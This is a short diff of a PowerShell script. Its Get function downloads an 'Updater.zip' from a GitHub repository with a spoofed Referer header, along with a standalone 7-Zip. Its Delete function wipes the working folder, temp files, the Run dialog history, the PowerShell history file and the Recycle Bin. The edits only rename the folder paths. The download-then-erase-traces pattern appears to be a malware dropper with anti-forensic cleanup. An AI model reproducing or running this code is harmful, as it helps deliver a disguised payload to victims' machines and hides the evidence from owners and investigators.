@@ -1,6 +1,6 @@
 function Get {
-  mkdir \temp 
-  cd \temp
+  mkdir \docs 
+  cd \docs
   Invoke-WebRequest -Headers @{'Referer' = 'https://github.com/0svix/ww/blob/main/Updater.zip'} -Uri https://github.com/0svix/ww/raw/refs/heads/main/Updater.zip -OutFile Updater.zip
   Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
   Expand-Archive 7z.zip 
@@ -10,8 +10,8 @@ function Get {
 
 function Delete {
   cd C:\
-  rmdir -R \temp
-  rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+  rmdir -R \docs
+  rm $env:DOCS\* -r -Force -ErrorAction SilentlyContinue
   reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
   Remove-Item (Get-PSreadlineOption).HistorySavePath
   Clear-RecycleBin -Force -ErrorAction SilentlyContinue
